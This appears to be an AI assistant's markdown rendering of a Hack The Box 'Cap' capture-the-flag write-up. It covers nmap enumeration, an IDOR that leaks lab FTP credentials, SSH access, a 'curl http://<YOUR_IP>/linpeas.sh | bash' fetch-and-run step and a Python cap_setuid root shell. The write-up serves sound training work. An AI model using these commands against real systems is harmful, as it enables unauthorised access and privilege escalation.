
Here’s how you can add these images to the **Cap** write-up on your GitHub page. I'll integrate the images with captions in the appropriate places.

### Write-up: **Hack The Box - Cap**

#### **01-Enumeration.md**
```markdown
# Enumeration

## Nmap
Start with an nmap scan to check open ports and services:
```bash
ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV 10.10.10.245
```

**Results**:
- Open Ports: 21 (FTP), 22 (SSH), 80 (HTTP)

![Nmap Scan Results](https://github.com/user-attachments/assets/c6fb655e-c500-40e1-b10d-a3e90491c67e)
)

The HTTP service is running **Gunicorn**, a Python-based HTTP server. No anonymous FTP access is available.

## HTTP Service
Browsing the HTTP server shows a dashboard with network-related functionalities. Certain pages display the output of commands like `ifconfig` and `netstat`, indicating that system commands are being executed in the background.

![Web Dashboard](../images/2%20Webpage.jpg)
![Network Info on Web Dashboard](../images/3%20Web%20Dashboard.jpg)
```

#### **02-Foothold.md**
```markdown
# Foothold

## IDOR Exploit
While creating packet captures, the URL follows the pattern `/data/<id>`. Incrementing the `id` allows access to previous users’ packet captures, revealing a vulnerability known as **Insecure Direct Object Reference (IDOR)**.

Downloading the capture file at `/data/0` and opening it in WireShark reveals FTP traffic containing plaintext credentials:
- **Username**: `nathan`
- **Password**: `Buck3tH4TF0RM3!`

![Security Snapshot](../images/4%20Security%20Snap%20shot.jpg)
![Security Snapshot - User 0](../images/5%20Scurity%20Snap%20Shot%20user%200.jpg)

## SSH Access
Use the credentials to log in via SSH:
```bash
ssh nathan@10.10.10.245
```

![SSH into Nathan](../images/9%20ssh%20into%20nathan.jpg)

You now have a foothold on the system.
```

#### **03-Privilege Escalation.md**
```markdown
# Privilege Escalation

## LinPEAS Scan
Run LinPEAS to find privilege escalation vectors. Download LinPEAS using a Python web server on your attacker machine:
```bash
sudo python3 -m http.server 80
```
Then, download and execute it from the target machine:
```bash
curl http://<YOUR_IP>/linpeas.sh | bash
```

The scan reveals that `/usr/bin/python3.8` has the following capabilities:
- **cap_setuid**
- **cap_net_bind_service**

### Exploit Python Capabilities
The **cap_setuid** capability allows the Python interpreter to switch to UID 0 (root) without the SUID bit set.

To exploit this, run the following Python commands to spawn a root shell:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```

## User Flag
After escalating privileges, retrieve the `user.txt` flag:
```bash
cat user.txt
```

![User Flag](../images/10%20user%20flag.jpg)
```

---

This Markdown content is designed for your GitHub write-up. Make sure the images are placed in a folder named `images` inside the Cap folder in your GitHub repository, and update the image paths accordingly.

Let me know if you need more adjustments!
